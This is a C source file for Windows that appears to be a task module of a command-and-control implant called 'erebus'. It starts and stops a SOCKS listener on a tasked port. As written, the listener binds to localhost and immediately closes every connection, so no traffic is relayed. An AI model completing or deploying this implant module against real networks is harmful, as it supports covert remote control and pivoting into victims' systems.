#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "erebus/pb_c2.h"
#include "erebus/pb_wire.h"

#pragma comment(lib, "ws2_32.lib")

static SOCKET g_socks_listen = INVALID_SOCKET;
static int g_socks_running;

static DWORD WINAPI socks_accept_loop(LPVOID param) {
    SOCKET ln = (SOCKET)(ULONG_PTR)param;
    while (g_socks_running) {
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(ln, &fds);
        struct timeval tv = { 1, 0 };
        if (select(0, &fds, NULL, NULL, &tv) <= 0) continue;
        SOCKET client = accept(ln, NULL, NULL);
        if (client != INVALID_SOCKET) closesocket(client);
    }
    return 0;
}

int erebus_task_socks_start(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len) {
    uint32_t port = 1080;
    if (data_len > 0) {
        erebus_pb_reader r;
        erebus_pb_reader_init(&r, data, data_len);
        uint32_t field;
        uint8_t wire;
        while (erebus_pb_reader_next(&r, &field, &wire)) {
            if (field == 1 && wire == 0) {
                uint64_t v;
                if (erebus_pb_read_varint(&r, &v)) port = (uint32_t)v;
            } else {
                erebus_pb_skip(&r, wire);
            }
        }
    }

    if (g_socks_running)
        return erebus_pb_encode_socks_start_result(1, port, out, out_len);

    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 0;

    char port_s[16];
    snprintf(port_s, sizeof(port_s), "%u", port);
    struct addrinfo hints = {0}, *res = NULL;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;
    if (getaddrinfo("127.0.0.1", port_s, &hints, &res) != 0) return 0;

    SOCKET ln = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (ln == INVALID_SOCKET) { freeaddrinfo(res); return 0; }
    if (bind(ln, res->ai_addr, (int)res->ai_addrlen) != 0) {
        closesocket(ln); freeaddrinfo(res); return 0;
    }
    freeaddrinfo(res);
    if (listen(ln, SOMAXCONN) != 0) { closesocket(ln); return 0; }

    g_socks_listen = ln;
    g_socks_running = 1;
    HANDLE th = CreateThread(NULL, 0, socks_accept_loop, (LPVOID)(ULONG_PTR)ln, 0, NULL);
    if (!th) { closesocket(ln); g_socks_listen = INVALID_SOCKET; g_socks_running = 0; return 0; }
    CloseHandle(th);
    return erebus_pb_encode_socks_start_result(1, port, out, out_len);
}

int erebus_task_socks_stop(const uint8_t *data, size_t data_len, uint8_t **out, size_t *out_len) {
    (void)data; (void)data_len;
    if (g_socks_running) {
        g_socks_running = 0;
        if (g_socks_listen != INVALID_SOCKET) {
            closesocket(g_socks_listen);
            g_socks_listen = INVALID_SOCKET;
        }
    }
    return erebus_pb_encode_socks_stop_result(1, out, out_len);
}